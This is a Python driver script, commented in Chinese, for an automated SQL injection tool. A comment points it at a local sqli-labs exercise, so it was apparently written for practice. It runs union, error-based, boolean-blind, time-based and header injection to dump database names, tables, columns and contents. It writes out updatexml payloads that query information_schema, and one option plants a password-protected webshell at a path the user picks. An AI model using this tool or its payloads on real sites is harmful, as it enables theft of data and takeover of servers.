# 盲注模块
import mang.init as m
# 联合注入模块
import lian.init as l
# 报错注入模块（其余模块原理相同注释都在报错模块上）
import bao.init as b
# 工具（写马模块）、
import util.SqlUtil as sql
# 时间注入模块
import timeService.init as ti
# 联合注入POST模块
import lian.initPost as lp
# 报错注入POST模块
import bao.initPost as bp
# 请求头注入模块
import header.init as hp

# http://192.168.10.149/sqlit/Less-15/
num=input("请选择注入方式1.联合2.报错3.布尔盲注4.写马(GET)/请求头注入(POST)")

ur=input("请输入url:")
po=input("请选择是否为post类型注入(Y/N)")
key=0
def keyBind(key,url):
    # 通过key值判断该进行什么样的注入
    if (key == 1):
        url = url.replace("'", "\"");
    elif (key == 2):
        url = url.replace("\"", "\")");
    elif (key == 3):
        url = url.replace("\")", "\')");
    elif (key == 4):
        url = url.replace("\')", "\'))");
    elif (key == 5):
        url = url.replace("\'))", "");
    return url


if(po=="Y" or po=="y"):
    urlpayload= "' ";
    url=ur;
    # key在注入尝试失败后会进行自增操作，然后传值给keyBind处理

    if(num=="1"):
        while(1):
            try:
                lp.db(url,urlpayload)
                data = input("请选择数据库")
                lp.table(url,urlpayload);
                table = input("请选择数据表")
                key = 0
                lp.colum(url,urlpayload, table)
                col = input("请选择字段")
                lp.xx(url,urlpayload, data, table, col)
                break;
                # 有错说明这样行不通，假设刚刚是单引号注入，现在尝试双引号
            except AttributeError:
                key+=1
                # 尝试新的注入方式
                urlpayload=keyBind(key,urlpayload)
    elif(num=="2"):
        zr=input("请选择注入点（选择username请输入0，选择password请输入1，选择cookie请输入2):")
        if(zr=="0"):
            while(1):
                # print("url=" + url)
                urlpayload = keyBind(key, urlpayload)
                s=bp.db(url,urlpayload)
                # 通过这个方式判断有没有错
                if(s.find("You have an error in your SQL syntax; ")!=-1 or s==""):
                    key+=1
                    continue
                print(s)
                db=input("请选择数据库")
                bp.table(url,urlpayload)
                table=input("请选择数据表")
                bp.colum(url, urlpayload, table)
                c=input("请选择字段:")
                bp.xx(url,urlpayload,db,table,c)
        elif(zr=="1"):
            while (1):
                # print("url=" + url)
                urlpayload = keyBind(key, urlpayload)
                s = bp.db(url, urlpayload,1)
                # 通过这个方式判断有没有错
                if (s.find("You have an error in your SQL syntax; ") != -1 or s == ""):
                    key += 1
                    continue
                print(s)
                db = input("请选择数据库")
                bp.table(url, urlpayload,1)
                table = input("请选择数据表")
                bp.colum(url, urlpayload, table,1)
                c = input("请选择字段:")
                bp.xx(url, urlpayload, db, table, c,1)

        elif(zr=="2"):
            while(1):
                # print("url=" + url)
                urlpayload = keyBind(key, urlpayload)
                s=bp.db(url,urlpayload,2)
                # 通过这个方式判断有没有错
                if(s.find("You have an error in your SQL syntax; ")!=-1 or s==""):
                    key+=1
                    continue
                print(s)
                db=input("请选择数据库")
                bp.table(url,urlpayload,2)
                table=input("请选择数据表")
                bp.colum(url, urlpayload, table,2)
                c=input("请选择字段:")
                bp.xx(url,urlpayload,db,table,c,2)
    elif(num=="3"):
        while (1):
            url = keyBind(key, url)
            r = ti.database_name(url,urlpayload);
            if (r == ""):
                key += 1
                continue
            database = input("请选择数据库:")
            ti.table_name(url, database,urlpayload)
            table = input("请选择数据表:");
            ti.column_name(url, table,urlpayload)
            key = 0
            co = input("请选择字段:");
            ti.list_data(url, database, table, co,urlpayload);

    elif(num=="4"):
        hb=input("请输入待注入的请求头名:")
        urlp=""
        while(1):
            urlp = input("请输入尝试的注入点（' or ') or ……）")
            hp.dz(url,hb,urlp,"updatexml(1,concat(0x5e,database()),1))#")
            # 此处用户判断，以适应灵活多变性
            yn=input("是否正确？(Y/N)")
            if(yn=="Y" or yn=="y"):
                break
        db = input("请选择数据库")
        hp.dz(url,hb,urlp,"updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database() )),1))#")
        table=input("请选择数据表")
        hp.dz(url,hb,urlp,f"updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table}' )),1))#")
        col=input("请选择字段")
        hp.dz(url,hb,urlp,f"updatexml(1,concat(0x5e,(select group_concat({col}) from {db}.{table} )),1))#")

else:
    if(num=="1"):
        # get注入嘛，先假设是单引号好了，行不通就调用keyBind函数进行其他方式注入
        url = ur + "?id=-1' ";
        while(1):
            try:

                l.db(url);
                data=input("请选择数据库")
                l.table(url);
                table=input("请选择数据表")
                key=0
                l.colum(url,table)
                col=input("请选择字段")
                l.xx(url,data,table,col)
                break;
            except AttributeError:
                key+=1
                url=keyBind(key,url)

    elif(num=="2"):

        url = ur + "?id=-1' ";
        while(1):
            # print("url=" + url)
            url = keyBind(key, url)
            s=b.db(url)
            if(s==""):
                key+=1
                continue
            db=input("请选择数据库")
            b.table(url,db)
            table=input("请选择数据表")
            b.colum(url, db, table)
            while(1):
                c=input("请选择字段:")
                num=input("请选择需要第几个人的信息:")
                b.xx(url,table,c,num)





    elif(num=="3"):
        n=input("选择布尔注入(0) or 时间注入(1)")
        url = ur + "?id=1' ";
        if(n=="0"):
            print("爆库:")
            m.db(url)
            database=input("请选择数据库:")
            m.table(url,database)
            table=input("请选择数据表:");
            m.columns(url,database,table)
            co=input("请选择字段:");
            m.nr(url,database,table,co);
        elif(n=="1"):
            while(1):
                url=keyBind(key,url)
                r=ti.database_name(url);
                if(r==""):
                    key+=1
                    continue
                database = input("请选择数据库:")
                ti.table_name(url, database)
                table = input("请选择数据表:");
                ti.column_name(url,table)
                key=0
                co = input("请选择字段:");
                ti.list_data(url, database,table,co);

    elif(num=="4"):
        url = ur + "?id=1'";
        path=input("请输入要写入的路径:")
        pw=input("请输入木马密码（默认\"cmd\")")
        if(pw==""):
            sql.writher(url,path)
        else:
            sql.writher(url,path,pw)
        print("写入成功!")



